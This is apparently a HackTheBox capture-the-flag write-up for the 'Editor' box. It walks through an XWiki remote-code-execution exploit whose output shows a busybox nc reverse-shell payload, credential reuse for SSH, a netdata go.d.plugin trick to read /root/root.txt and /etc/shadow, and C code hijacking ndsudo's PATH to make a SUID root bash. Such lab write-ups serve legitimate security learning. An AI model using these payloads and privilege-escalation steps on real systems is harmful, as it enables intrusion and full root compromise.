# Write-up: Editor @ HackTheBox

Editor is an “easy” level Linux box that will have us exploiting an XWiki instance and a vulnerable netdata agent. 

## **Initial Reconnaissance**

A quick nmap shows us three open ports: 22, 80, 8080.

```
┌──(kali㉿kali)-[~]
└─$ nmap -A editor.htb         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 10:14 EST
Nmap scan report for editor.htb (10.129.229.223)
Host is up (0.100s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   76.64 ms 10.10.16.1
2   37.26 ms editor.htb (10.129.229.223)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 423.25 seconds

```

Port 80 is a static website for a free, Python-based text editor called SimplistCode Pro. Surprisingly, the application is an actual, working text editor with downloadable Debian and Windows packages. The application uses PyInstaller, which means it is relatively easy to pull a lot of data out of it using some freely available utilities. However, it ends up not getting us anywhere, so I’ll skip the details. 

![image.png](../images/editor/simplist1.png)

On a more productive note, the “Docs” link in the upper right-hand corner sends us to wiki.editor.htb. This appears to be the same application as the one running on port 8080. Visiting the website reveals it’s an XWiki instance:

![image.png](../images/editor/xwiki.png)

XWiki is a Java-based, open-source Wiki software. We find a user named “neal” on it, and a couple of mostly uninteresting pages about SimplistCode Pro.

## **Shell as xwiki**

First, let’s quickly follow up on nmap’s flag about the potentially risky allowed methods from http-webdav-scan. We first try using davtest on a few endpoints (just to follow up on nmap’s flag) but this doesn’t give us anything useful. There is a user named “neal,” and we experiment with using password reset on him. I spend a little bit of time trying to expose the token, but ultimately end up simply searching for a known CVE. 

**CVE-2025-24893** allows unauthenticated remote code execution on XWiki via SolrSearch.

It works like this:
 
`GET /xwiki/bin/view/Main/SolrSearchMacros?search=... (with embedded Groovy code)`

I don’t know any Groovy code, but thankfully some mysterious strangers released some working tools to exploit this within a day of the box going live. What a coincidence!

I use [this tool](https://github.com/nopgadget/CVE-2025-24893) from nopgadget. 

```
┌──(kali㉿kali)-[~/workspace/editor]
└─$ python3 exploit.py -i 10.10.16.42 -p 6666 wiki.editor.htb
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made by nopgadget
Based on the original script by Al Baradi Joy
Self-Contained Reverse Shell Version
================================================================================
[!] Target URL: wiki.editor.htb
[!] Callback IP: 10.10.16.42
[!] [Callback Port: 6666
[!] Max Reconnections: 5
[!] First, let's test if the exploit works...
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb
[+] Testing exploit with command: id
[✔] Test successful! Exploit is working.
[+] Response: <p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;](http://cve-2025-24893.py/) 
...<snip>...
[!] Exploit test successful! Now trying reverse shell...
[+] Starting listener on 10.10.16.42:6666
[+] Trying to bind to 10.10.16.42 on port 6666: Done
[+] Waiting for connections on 10.10.16.42:6666: Got connection from 10.129.247.49 on port 35702
[✔] Listener started successfully on 10.10.16.42:6666
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb
[+] Using payload: busybox nc 10.10.16.42 6666 -e /bin/sh
[+] Sending reverse shell payload to: http://wiki.editor.htb
[✔] Exploit payload sent successfully!
[+] Response status: 200
[+] Response length: 1618
[✔] Waiting for reverse shell connection...
[✔] Reverse shell connected!
[+] Interactive shell ready. Type 'exit' to quit.
[+] If connection drops, the shell will automatically reconnect.
[*] Switching to interactive mode
$ ls
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
$ whoami
xwiki
```

## **Shell as oliver**

We check /etc/passwd and /home for users, revealing a single user named “oliver.” There’s no sudo access, so that’s out. We then take a look at the running services on the machine.

```
$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:37539         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      1127/java           
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      1127/java           
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.1:8125          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

A bunch of interesting ports, but the one that immediately jumps out is 3306. XWiki is likely configured to use MySQL, which means there’s probably credentials to actually use it lying around somewhere. A few Google searches later and we find that XWiki’s database configuration is kept in a file called hibernate.cfg.xml. We run this:

```bash
find / -name "hibernate.cfg.xml" 2>/dev/null
```

The first result gets us our credentials:

```bash
$ cat /etc/xwiki/hibernate.cfg.xml
<?xml version="1.0" encoding="UTF-8"?>

<!--
 * See the NOTICE file distributed with this work for additional
 * information regarding copyright ownership.
 
 ...<snip>...
 
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

```

There is nothing interesting in the MySQL database, but the credentials work for the “oliver” user. We can login via SSH with `oliver / theEd1t0rTeam99` .

```
┌──(kali㉿kali)-[~/workspace/editor]
└─$ ssh oliver@editor.htb    
The authenticity of host 'editor.htb (10.129.247.49)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:79: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
oliver@editor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
```

An initial connection to the database with those credentials yields nothing of interest. But this turns out to be a classic credential reuse scenario: we can use that password to ssh into oliver. We grab the user flag and proceed with further enumeration.

First, let’s learn about our user:

```bash
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

OK, we’re in the netdata group. I’m going to take a wild guess and say that the solution will probably be related to netdata. This is probably one of our open ports. Let’s check one of them:

```bash
oliver@editor:~$ curl 127.0.0.1:19999
<!doctype html><html><head><title>Netdata Agent Console</title><script>let pathsRegex = /\/(spaces|nodes|overview|alerts|dashboards|anomalies|events|cloud|v2)\/?.*
```

Yup. There we go. Let’s forward the port:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

We get a monitoring panel for netdata. There’s nothing we can do here, but there is a big banner at the top:

![image.png](../images/editor/panel.png)

The agent is flagged for needing a “critical” severity security patch. It just might have an exploitable CVE.

[And it does.](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) Seems straightforward: there is a binary with SUID set, owned by root, located at /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

This binary is intended allow netdata to run some pre-defined binaries as root without relying on sudo. However, it relies on the user-controlled PATH to find the binary. We can use path hijacking to make it execute our code instead.

```
oliver@editor:/tmp$ export PATH=/tmp:$PATH
oliver@editor:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Then write a script to our home directory, named nvme:

```bash
#!/bin/bash

cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
```

Then we run ndsudo with nvme-list…

And it doesn’t work. I actually had a bit of an issue here - ndsudo *should* run anything here as root. However, it ends up instead running my script as *oliver.* Instead of fixing this issue, I wander off and find something else to exploit.

## **Root Flag (Unintended)**

Let’s back things up a bit and re-enumerate. I upload and run LinPEAS. Most of the script output is not too helpful, but this jumped out:

```
Files with capabilities (limited to 50):
/opt/netdata/usr/libexec/netdata/plugins.d/slabinfo.plugin cap_dac_read_search=ep
/opt/netdata/usr/libexec/netdata/plugins.d/debugfs.plugin cap_dac_read_search=ep
/opt/netdata/usr/libexec/netdata/plugins.d/apps.plugin cap_dac_read_search,cap_sys_ptrace=ep
/opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin cap_dac_read_search,cap_net_admin,cap_net_raw=eip
/opt/netdata/usr/libexec/netdata/plugins.d/perf.plugin cap_perfmon=ep
```

cap_dac_read_search means that the binary is able to read any file on the system. go.d.plugin seems promising, so we run it without any flags. We get quite a lot of output, but we see something of interest in it.

```
ERR error on parsing response : can't parse '[<!doctype html> <html lang="en"> <head> <meta charset="UTF-8" /> <link rel="icon" type="image/svg+xml" href="/vite.svg" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Editor - SimplistCode Pro</title> <meta name="description" content="A Futuristic Code Editor for Everyone. SimplistCode Pro — Minimal. Powerful. Redefined for the modern developer." /> <script type="module" crossorigin src="/assets/index-VRKEJlit.js"></script> <link rel="stylesheet" crossorigin href="/assets/index-DzxC4GL5.css"> </head> <body> <div id="root"></div> </body> </html>]' collector=nginx job=local
ERR check failed collector=nginx job=local
CONFIG go.d:collector:nginx:local status failed
```

It’s leaking a lot of information in the error messages. This gives me an idea: can we trick it into reading a file we shouldn’t be able to read, and then leak its contents in an error? Checking the documentation, we see that enabled modules are listed in `go.d.conf.` 

We can also set custom jobs, like this:

```
jobs:
  - name: some_name1
  - name: some_name2
```

Running it with -h gives us some options we can use, including (crucially) debug mode.

```bash
Application Options:
  -m, --modules=    module name to run (default: all)
  -c, --config-dir= config dir to read
  -w, --watch-path= config path to watch
  -d, --debug       debug mode
  -v, --version     display the version and exit
```

We don’t have to modify the config files (which are owned by root and not writable), because -c allows us to specify new config files at runtime. And as it turns out, we can actually use config files to tell the modules what to do. 

On our first try, we give nginx a shot and see if it’ll try to read something with the file protocol.

We put this into /tmp/nginx.conf:

```
cat > nginx.conf << EOF
jobs:
   -name: file_read
    path: file:///root/root.txt
   -name: file_read2
    path: file:///etc/shadow
EOF
```

Then we run this command:

```bash
./go.d.plugin -d -m nginx -c /tmp/ 
```

-d enables debug mode, -m tells go.d.plugin to only run the nginx collector, and -c specifies our config directory. The result?

```
INF agent/setup.go:79 building discovery config component=agent
DBG agent/setup.go:126 looking for 'nginx.conf' in [/tmp/] component=agent
DBG agent/setup.go:142 found '/tmp/nginx.conf component=agent
…
ERR nginx/nginx.go:77 error on request : Get "file:///root/root.txt": unsupported protocol scheme "file" collector=nginx job=file_read
ERR module/job.go:238 check failed collector=nginx job=file_read
```

…

```
ERR nginx/nginx.go:77 error on request : Get "file:///root/root.txt": unsupported protocol scheme "file" collector=nginx job=file_read
ERR module/job.go:238 check failed collector=nginx job=file_read
```

Partial success! We are able to create custom jobs for the modules, but the nginx module doesn’t support the [file://](file://) protocol. This module is probably not going to be helpful. Looking through go.d.conf, we find a better target: web_log. What if we point a log parser at something that isn’t a log file?

We write this to /tmp/web_log.conf:

```
oliver@editor:/tmp$ cat > web_log.conf << EOF
jobs:
   - name: file_read
     path: /root/root.txt
   - name: file_read2
     path: /etc/shadow
EOF
```

Then we run:

```bash
./go.d.plugin -d -m web_log -c /tmp/
```

And the result?

![image.png](../images/editor/rooted.png)

Boom! The output also contains root.txt! 

## **Root Shell (Intended)**

OK, so why didn’t our ndsudo exploit work? Let’s look at what we tried.

First, we tried a bash script that copied /bin/bash to /tmp as root and then set the SUID bit on it. Second, we tried to do so the same thing with compiled C code, using system() instead. Both of these ended up dropping privileges. Why?

When `ndsudo` calls a binary, it does this:

```c
        char *clean_env[] = {NULL};
        execve(filename, params, clean_env);
        perror("execve"); // execve only returns on error
        return 6;
```

Our malicious Linux process stores three things that define its privileges: Real User ID, Effective User ID, and Saved Set-User-ID. The Real User ID (RUID) is, of course, the actual user that started the process. The Effective User ID (EUID) is the user that the process is running as. Finally, the Saved Set-User-ID (SSUID) is the UID we had at the same we `ndsudo` executed our binary. 

When `ndsudo` calls our malicious binary or bash script, it sets the euid to 0 but it leaves the ruid as `oliver`. This allows it to run as root. When our malicious binary then calls `/bin/sh`, the shell will notice that the effective uid and the real uid don’t match. As a security precaution, it will instead run as `oliver`.

Similarly, if we run a binary that uses system() calls, it *actually* calls `execve("/bin/sh", ["/bin/sh", "-c", "[exploit command]"]`. Once again, the shell will drop privileges.

There are three ways to bypass this. First, we can use setuid and setgid. When setuid is called with 0 (root), it will set both the effective and real uids to 0. The shell will be happy that these are equal to each other, and it will run as root.

```c
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

Or, we can run bash in privileged mode. This will tell bash to ignore the difference between the euid and ruid.

```c                                                                                                     
#include <unistd.h>

int main() {
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

Or we can bypass calling a shell altogether.

```c
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>

int main() {    
    pid_t pid = fork();
    
    if (pid == 0) {
        execl("/bin/cp", "cp", "/bin/bash", "/tmp/bash", NULL);
        return 1;
    }
   
    waitpid(pid, NULL, 0);
    chmod("/tmp/bash", 04755);
    
    return 0;
}
```

We will use the third, slightly more manual option. We compile it on our local machine and spin up a http server.

```
┌──(kali㉿kali)-[~/workspace]
└─$ gcc binbashexploit.c -o rootbashmaker

┌──(kali㉿kali)-[~/workspace]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
```

Then we pull it down and fix our PATH.

```
oliver@editor:/tmp$ wget http://10.10.16.42:1234/rootbashmaker -O ./nvme
--2025-11-27 02:35:46--  http://10.10.16.42:1234/rootbashmaker
Connecting to 10.10.16.42:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16112 (16K) [application/octet-stream]
Saving to: ‘./nvme’

./nvme                                                  100%[==============================================================================================================================>]  15.73K  --.-KB/s    in 0.1s    

2025-11-27 02:35:46 (140 KB/s) - ‘./nvme’ saved [16112/16112]

oliver@editor:/tmp$ export PATH=/tmp:$PATH
oliver@editor:/tmp$ chmod +x nvme
oliver@editor:/tmp$ /opt/netdata/netdata-plugins/plugins.d/ndsudo nvme-list

```

Our rootbash is in /tmp.

```
oliver@editor:/tmp$ ls -al
total 1412
drwxrwxrwt  8 root    root       4096 Nov 27 02:35 .
drwxr-xr-x 18 root    root       4096 Jul 29 11:55 ..
-rwsr-xr-x  1 root    oliver  1396520 Nov 27 02:35 bash
srwxrwx---  1 netdata netdata       0 Nov 27 02:17 netdata-ipc
---x--x--x  1 oliver  oliver    16112 Nov 27 02:34 nvme
drwx------  3 root    root       4096 Nov 27 02:17 systemd-private-61496f0376cd45a9952d04617ac6590a-ModemManager.service-IYwVMB
drwx------  3 root    root       4096 Nov 27 02:17 systemd-private-61496f0376cd45a9952d04617ac6590a-systemd-logind.service-8Om96w
drwx------  3 root    root       4096 Nov 27 02:17 systemd-private-61496f0376cd45a9952d04617ac6590a-systemd-resolved.service-z3bw5X
drwx------  3 root    root       4096 Nov 27 02:17 systemd-private-61496f0376cd45a9952d04617ac6590a-systemd-timesyncd.service-MLyhgV
drwx------  3 root    root       4096 Nov 27 02:17 systemd-private-61496f0376cd45a9952d04617ac6590a-xwiki.service-hTGxwB
drwx------  2 root    root       4096 Nov 27 02:17 vmware-root_610-2731152165

```

We can use the -p flag to gain root.

```
oliver@editor:/tmp$ ./bash -p
bash-5.1# whoami
root
bash-5.1# ls -al /root
total 44
drwx------  8 root root 4096 Nov 27 02:17 .
drwxr-xr-x 18 root root 4096 Jul 29 11:55 ..
lrwxrwxrwx  1 root root    9 Jul  1 19:19 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  2 root root 4096 Jun 19 08:14 .config
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Nov 27 02:17 root.txt
drwxr-xr-x  2 root root 4096 Jun 19 08:14 scripts
drwx------  3 root root 4096 Apr 27  2023 snap
drwx------  2 root root 4096 Jun 19 11:30 .ssh

